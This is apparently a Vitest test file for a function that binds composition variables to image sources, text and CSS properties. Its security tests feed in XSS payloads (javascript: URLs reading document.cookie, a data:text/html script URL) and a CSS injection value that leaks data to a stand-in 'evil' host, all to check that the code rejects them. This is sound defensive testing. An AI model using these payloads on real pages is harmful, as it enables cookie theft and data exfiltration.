/**
 * @vitest-environment jsdom
 */
import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { applyVariableBindings } from "./applyVariableBindings";
import { getVariables } from "./getVariables";

type TestWindow = Window & {
  __hfVariables?: unknown;
  __hfVariablesByComp?: Record<string, Record<string, unknown>>;
  __hyperframes?: { getVariables?: () => Record<string, unknown> };
};

const win = window as TestWindow;

beforeEach(() => {
  win.__hyperframes = { getVariables };
});

afterEach(() => {
  delete win.__hfVariables;
  delete win.__hfVariablesByComp;
  delete win.__hyperframes;
  document.documentElement.removeAttribute("data-composition-variables");
  document.body.innerHTML = "";
});

function setDeclared(decls: unknown[]): void {
  document.documentElement.setAttribute("data-composition-variables", JSON.stringify(decls));
}

describe("applyVariableBindings", () => {
  it("sets src from a string variable via data-var-src", () => {
    setDeclared([{ id: "hero", type: "image", label: "Hero", default: "default.jpg" }]);
    document.body.innerHTML = `
      <div data-hf-root data-composition-id="c1">
        <img id="img" data-var-src="hero" src="fallback.jpg" />
      </div>`;
    applyVariableBindings(document);
    expect(document.getElementById("img")?.getAttribute("src")).toBe("default.jpg");
  });

  it("render-time overrides win, and {url} image values resolve", () => {
    setDeclared([{ id: "hero", type: "image", label: "Hero", default: "default.jpg" }]);
    win.__hfVariables = { hero: { url: "https://cdn/override.png" } };
    document.body.innerHTML = `
      <div data-hf-root><video data-var-src="hero" src="fallback.mp4"></video></div>`;
    applyVariableBindings(document);
    expect(document.querySelector("video")?.getAttribute("src")).toBe("https://cdn/override.png");
  });

  it("keeps the authored src when the variable resolves to nothing", () => {
    document.body.innerHTML = `<div data-hf-root><img data-var-src="ghost" src="keep.jpg" /></div>`;
    applyVariableBindings(document);
    expect(document.querySelector("img")?.getAttribute("src")).toBe("keep.jpg");
  });

  it("sets text content from a scalar via data-var-text", () => {
    setDeclared([{ id: "title", type: "string", label: "Title", default: "Hello" }]);
    win.__hfVariables = { title: "Overridden" };
    document.body.innerHTML = `<div data-hf-root><h1 data-var-text="title">Authored</h1></div>`;
    applyVariableBindings(document);
    expect(document.querySelector("h1")?.textContent).toBe("Overridden");
  });

  it("applies scalar variables as --{id} custom props on the root", () => {
    setDeclared([
      { id: "accent", type: "color", label: "Accent", default: "#00C3FF" },
      { id: "count", type: "number", label: "Count", default: 3 },
    ]);
    win.__hfVariables = { accent: "#ff0000" };
    document.body.innerHTML = `<div id="root" data-hf-root></div>`;
    applyVariableBindings(document);
    const root = document.getElementById("root");
    expect(root?.style.getPropertyValue("--accent")).toBe("#ff0000");
    expect(root?.style.getPropertyValue("--count")).toBe("3");
  });

  it("applies a font value's family name, and skips other objects", () => {
    win.__hfVariables = {
      brandFont: { name: "Inter", source: "https://fonts" },
      img: { url: "x" },
    };
    document.body.innerHTML = `<div id="root" data-hf-root></div>`;
    applyVariableBindings(document);
    const root = document.getElementById("root");
    expect(root?.style.getPropertyValue("--brandFont")).toBe("Inter");
    expect(root?.style.getPropertyValue("--img")).toBe("");
  });

  it("preserves element children when binding text on a container", () => {
    win.__hfVariables = { title: "Replaced" };
    document.body.innerHTML = `
      <div data-hf-root>
        <h1 data-var-text="title">Hello <em id="kid" class="clip">world</em></h1>
      </div>`;
    applyVariableBindings(document);
    const h1 = document.querySelector("h1");
    expect(document.getElementById("kid")?.textContent).toBe("world");
    expect(h1?.childNodes[0]?.nodeValue).toBe("Replaced");
  });

  it("is idempotent across re-application (loader re-apply path)", () => {
    win.__hfVariables = { title: "Once" };
    document.body.innerHTML = `<div data-hf-root><h1 data-var-text="title">t</h1></div>`;
    applyVariableBindings(document);
    applyVariableBindings(document);
    expect(document.querySelector("h1")?.textContent).toBe("Once");
  });

  it("resolves sub-composition elements against their scoped values", () => {
    win.__hfVariablesByComp = { sub: { label: "Scoped" } };
    win.__hfVariables = { label: "TopLevel" };
    document.body.innerHTML = `
      <div data-hf-root data-composition-id="main">
        <p id="top" data-var-text="label">t</p>
        <div data-composition-id="sub"><p id="inner" data-var-text="label">s</p></div>
      </div>`;
    applyVariableBindings(document);
    expect(document.getElementById("inner")?.textContent).toBe("Scoped");
    expect(document.getElementById("top")?.textContent).toBe("TopLevel");
  });

  describe("security", () => {
    it("refuses data-var-src on a non-media tag (XSS sink)", () => {
      win.__hfVariables = { evil: "javascript:alert(document.cookie)" };
      document.body.innerHTML = `<div data-hf-root><iframe id="f" data-var-src="evil"></iframe></div>`;
      applyVariableBindings(document);
      // No src written — the iframe can't be turned into a javascript: executor.
      expect(document.getElementById("f")?.hasAttribute("src")).toBe(false);
    });

    it("refuses an unsafe URL protocol even on an allowed media tag", () => {
      win.__hfVariables = {
        evil: "javascript:alert(1)",
        data: "data:text/html,<script>x</script>",
      };
      document.body.innerHTML = `
        <div data-hf-root>
          <img id="a" data-var-src="evil" src="keep.jpg" />
          <video id="b" data-var-src="data" src="keep.mp4"></video>
        </div>`;
      applyVariableBindings(document);
      // Authored src preserved; the unsafe value is not applied.
      expect(document.getElementById("a")?.getAttribute("src")).toBe("keep.jpg");
      expect(document.getElementById("b")?.getAttribute("src")).toBe("keep.mp4");
    });

    it("allows https, blob, relative, and image data: URLs on media tags", () => {
      win.__hfVariables = {
        https: "https://cdn/x.png",
        rel: "./local.png",
        img: "data:image/png;base64,AAAA",
      };
      document.body.innerHTML = `
        <div data-hf-root>
          <img id="h" data-var-src="https" src="f.png" />
          <img id="r" data-var-src="rel" src="f.png" />
          <img id="d" data-var-src="img" src="f.png" />
        </div>`;
      applyVariableBindings(document);
      expect(document.getElementById("h")?.getAttribute("src")).toBe("https://cdn/x.png");
      expect(document.getElementById("r")?.getAttribute("src")).toBe("./local.png");
      expect(document.getElementById("d")?.getAttribute("src")).toBe("data:image/png;base64,AAAA");
    });

    it("strips declaration-smuggling characters from a CSS custom property value", () => {
      setDeclared([{ id: "accent", type: "string", label: "Accent", default: "red" }]);
      win.__hfVariables = { accent: "red; background: url(//evil?data=secret)" };
      document.body.innerHTML = `<div id="root" data-hf-root></div>`;
      applyVariableBindings(document);
      const css = document.getElementById("root")?.style.getPropertyValue("--accent") ?? "";
      expect(css).not.toContain(";");
      expect(css).not.toContain("{");
      expect(css).not.toContain("<");
    });
  });
});
